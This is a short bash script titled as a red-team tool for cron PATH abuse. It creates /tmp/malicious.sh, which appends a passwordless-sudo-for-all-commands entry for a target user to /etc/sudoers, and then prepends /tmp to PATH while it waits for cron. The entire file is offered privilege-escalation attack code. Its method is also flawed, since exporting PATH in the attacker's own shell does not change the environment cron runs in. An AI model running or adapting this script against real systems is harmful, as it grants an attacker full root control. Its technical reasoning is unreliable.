#!/bin/bash

# Red Team - Cron Path Abuse for Privilege Escalation

TARGET_USER="targetuser"
MALICIOUS_BINARY="/tmp/malicious.sh"

# Create a malicious script that will be executed by cron
cat << EOF > $MALICIOUS_BINARY
#!/bin/bash
echo "$TARGET_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
EOF

chmod +x $MALICIOUS_BINARY

# Modify PATH environment variable to point to our malicious binary first
export PATH="/tmp:$PATH"

echo "[+] Malicious binary injected into the PATH. Waiting for cron to execute..."